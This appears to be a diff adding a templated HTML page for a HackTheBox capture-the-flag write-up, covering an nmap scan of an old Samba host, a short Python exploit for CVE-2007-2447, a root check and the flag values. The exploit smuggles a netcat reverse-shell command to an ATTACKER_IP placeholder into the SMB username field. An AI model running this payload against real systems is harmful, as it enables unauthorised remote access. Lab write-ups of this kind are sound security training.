@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>MACHINE_NAME — ruiz00 Writeup</title>
+  <meta name="description" content="HackTheBox writeup for MACHINE_NAME by ruiz00">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;400;600;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../../assets/css/main.css">
+  <link rel="stylesheet" href="../../assets/css/writeup.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/base16/monokai.min.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+</head>
+<body>
+  <div class="scanlines"></div>
+  <canvas id="matrix-canvas"></canvas>
+
+  <nav class="nav">
+    <div class="nav-brand">
+      <a href="../../index.html" style="text-decoration:none">
+        <span class="nav-bracket">[</span>
+        <span class="nav-logo">ruiz00</span>
+        <span class="nav-bracket">]</span>
+      </a>
+    </div>
+    <div class="nav-links">
+      <a href="../../index.html#writeups" class="nav-link">← Back to Writeups</a>
+    </div>
+  </nav>
+
+  <main class="writeup-main">
+    <!-- Writeup Header -->
+    <header class="writeup-header">
+      <div class="writeup-meta-row">
+        <span class="card-badge htb">HTB</span>
+        <span class="card-diff easy">Easy</span>
+        <span class="writeup-os">🐧 Linux</span>
+        <span class="writeup-date">Published: 2024-01-15</span>
+        <span class="writeup-points">⚡ 20 pts</span>
+      </div>
+      <h1 class="writeup-title">MACHINE_NAME</h1>
+      <div class="writeup-tags">
+        <span class="tag">Tag1</span>
+        <span class="tag">Tag2</span>
+        <span class="tag">Tag3</span>
+      </div>
+      <div class="writeup-toc">
+        <div class="toc-header">// Table of Contents</div>
+        <ol class="toc-list">
+          <li><a href="#recon">01. Reconnaissance</a></li>
+          <li><a href="#foothold">02. Foothold</a></li>
+          <li><a href="#privesc">03. Privilege Escalation</a></li>
+          <li><a href="#flags">04. Flags</a></li>
+        </ol>
+      </div>
+    </header>
+
+    <!-- Writeup Content -->
+    <article class="writeup-content">
+
+      <section id="recon">
+        <h2>01. Reconnaissance</h2>
+        <p>Starting with an Nmap scan to identify open ports and running services:</p>
+        <div class="code-block">
+          <div class="code-header">
+            <span class="code-lang">bash</span>
+            <button class="copy-btn" onclick="copyCode(this)">copy</button>
+          </div>
+          <pre><code class="language-bash">nmap -sV -sC -p- --min-rate 5000 -oN nmap.txt 10.10.10.X</code></pre>
+        </div>
+        <div class="code-block output">
+          <div class="code-header">
+            <span class="code-lang">output</span>
+          </div>
+          <pre><code>Starting Nmap 7.94 ( https://nmap.org )
+PORT    STATE SERVICE     VERSION
+21/tcp  open  ftp         vsftpd 2.3.4
+22/tcp  open  ssh         OpenSSH 4.7p1 Debian
+139/tcp open  netbios-ssn Samba smbd 3.X
+445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian</code></pre>
+        </div>
+        <div class="callout info">
+          <span class="callout-icon">ℹ</span>
+          <div>Interesting! Samba version 3.0.20 is running — this is a very old version that may be vulnerable to known exploits.</div>
+        </div>
+      </section>
+
+      <section id="foothold">
+        <h2>02. Foothold</h2>
+        <p>After researching the Samba version, we find it's vulnerable to <strong>CVE-2007-2447</strong> — a command execution vulnerability in the username field.</p>
+        <div class="code-block">
+          <div class="code-header">
+            <span class="code-lang">python</span>
+            <button class="copy-btn" onclick="copyCode(this)">copy</button>
+          </div>
+          <pre><code class="language-python">from smb.SMBConnection import SMBConnection
+
+# Exploit CVE-2007-2447
+username = "/=`nohup nc -e /bin/sh ATTACKER_IP 4444`"
+conn = SMBConnection(username, "", "", "")
+conn.connect("10.10.10.X", 139)</code></pre>
+        </div>
+        <div class="callout success">
+          <span class="callout-icon">✓</span>
+          <div>Shell received! We land directly as <code>root</code> — no privilege escalation needed.</div>
+        </div>
+      </section>
+
+      <section id="privesc">
+        <h2>03. Privilege Escalation</h2>
+        <p>In this case, the exploit gives us a root shell directly. Let's verify:</p>
+        <div class="code-block">
+          <div class="code-header"><span class="code-lang">bash</span></div>
+          <pre><code class="language-bash">id
+# uid=0(root) gid=0(root) groups=0(root)
+hostname
+# lame</code></pre>
+        </div>
+      </section>
+
+      <section id="flags">
+        <h2>04. Flags</h2>
+        <div class="flags-grid">
+          <div class="flag-card user">
+            <div class="flag-label">🏳 User Flag</div>
+            <div class="flag-path">/home/makis/user.txt</div>
+            <div class="flag-value">69454a937d94f5f0225ea00acd2e84c5</div>
+          </div>
+          <div class="flag-card root">
+            <div class="flag-label">🏴 Root Flag</div>
+            <div class="flag-path">/root/root.txt</div>
+            <div class="flag-value">92caac3be140ef409e45721348a4e9df</div>
+          </div>
+        </div>
+      </section>
+
+      <!-- Navigation between writeups -->
+      <div class="writeup-nav">
+        <a href="#" class="writeup-nav-btn prev">← Previous Box</a>
+        <a href="../../index.html#writeups" class="writeup-nav-btn all">All Writeups</a>
+        <a href="#" class="writeup-nav-btn next">Next Box →</a>
+      </div>
+
+    </article>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+      <div class="footer-brand"><span class="nav-bracket">[</span>ruiz00<span class="nav-bracket">]</span></div>
+      <p class="footer-copy">Built with ♥ | GitHub Pages</p>
+    </div>
+  </footer>
+
+  <script src="../../assets/js/matrix.js"></script>
+  <script>
+    hljs.highlightAll();
+    function copyCode(btn) {
+      const code = btn.closest('.code-block').querySelector('code').textContent;
+      navigator.clipboard.writeText(code).then(() => {
+        btn.textContent = 'copied!';
+        setTimeout(() => btn.textContent = 'copy', 2000);
+      });
+    }
+  </script>
+</body>
+</html>
